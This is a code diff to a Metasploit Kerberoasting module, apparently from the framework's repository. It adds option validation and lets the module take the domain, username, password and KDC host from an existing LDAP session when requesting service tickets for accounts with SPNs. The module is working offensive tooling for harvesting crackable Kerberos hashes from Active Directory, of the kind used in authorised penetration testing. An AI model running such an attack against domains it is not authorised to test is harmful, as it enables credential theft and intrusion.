@@ -44,16 +44,11 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RHOSTS(nil, true, 'The target KDC, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html'),
         OptString.new('TARGET_USER', [ false, 'Specific user to kerberoast' ]),
         OptString.new('Rhostname', [ false, "The domain controller's hostname"], aliases: ['LDAP::Rhostname']),
         Msf::OptAddress.new('DomainControllerRhost', [false, 'The resolvable rhost for the Domain Controller'], fallbacks: ['rhost']),
       ]
     )
-    register_option_group(name: 'SESSION',
-                          description: 'Used when connecting to LDAP over an existing SESSION',
-                          option_names: %w[RHOSTS],
-                          required_options: %w[SESSION RHOSTS])
     register_advanced_options(
       [
         OptEnum.new('LDAP::Auth', [true, 'The Authentication mechanism to use', Msf::Exploit::Remote::AuthOption::NTLM, Msf::Exploit::Remote::AuthOption::LDAP_OPTIONS]),
@@ -77,7 +72,19 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
   end
 
+  def verify_option(opt)
+    value = datastore[opt]
+    if session.nil? && value.blank?
+      fail_with(Msf::Module::Failure::BadConfig, "You must set the '#{opt}' option when running the module without a pre-existing LDAP session.")
+    end
+  end
+
+  def verify_options
+    %w[LDAPDomain LDAPUsername LDAPPassword].each { |opt| verify_option(opt) }
+  end
+
   def run_user
+    verify_options
     user = datastore['TARGET_USER']
     filter = "(&(objectClass=user)(sAMAccountName=#{Net::LDAP::Filter.escape(user)}))"
     attributes = ['servicePrincipalName', 'sAMAccountName']
@@ -103,6 +110,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_ldap
+    verify_options
     jtr_formats = Set.new
     hashes = []
     run_builtin_ldap_query('ENUM_USER_SPNS_KERBEROAST') do |result|
@@ -142,10 +150,13 @@ class MetasploitModule < Msf::Auxiliary
       name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
       name_string: components
     )
-    domain_name = datastore['LDAPDomain']
+    # If we have a session set, we can use the login and domain information from it.
+    # But we need to let the user specify the KDC, as it might not be the Rhost the session is connected to
+    domain_name = session ? session.client.realm : datastore['LDAPDomain']
     rhostname = datastore['DomainControllerRhost']
-    username = datastore['LDAPUsername']
-    password = datastore['LDAPPassword']
+    rhostname ||= session.client.peerhost if session
+    username = session ? session.client.username : datastore['LDAPUsername']
+    password = session ? session.client.password : datastore['LDAPPassword']
     authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(
       host: rhostname,
       realm: domain_name,
